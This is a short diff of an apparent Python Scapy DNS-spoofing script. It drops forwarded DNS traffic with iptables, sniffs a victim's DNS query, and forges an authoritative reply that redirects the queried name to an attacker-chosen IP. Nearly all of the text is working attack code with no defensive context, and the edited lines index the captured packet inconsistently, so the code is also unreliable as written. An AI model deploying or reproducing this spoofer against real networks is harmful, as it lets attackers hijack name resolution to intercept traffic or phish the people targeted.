@@ -8,8 +8,8 @@ firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
 Popen([firewall], shell=True, stdout=PIPE)
 
 
-packet=sniff(count=1, filter="udp and port 53 and host " + victimIP)
-if packet.getlayer(DNS) and packet.getlayer(DNS).qr==0:
-    spoof = ((Ether())/IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=gotoIP)))
+a=sniff(count=1, filter="udp and port 53 and host " + victimIP)
+if a[0].haslayer(DNS) and a[0].getlayer(DNS).qr==0:
+    spoof = ((Ether())/IP(dst=a[IP].src, src=a[IP].dst)/UDP(dport=a[UDP].sport, sport=a[UDP].dport)/DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1,an=DNSRR(rrname=a[DNS].qd.qname, ttl=10, rdata=gotoIP)))
     sendp(spoof, count=1)
     
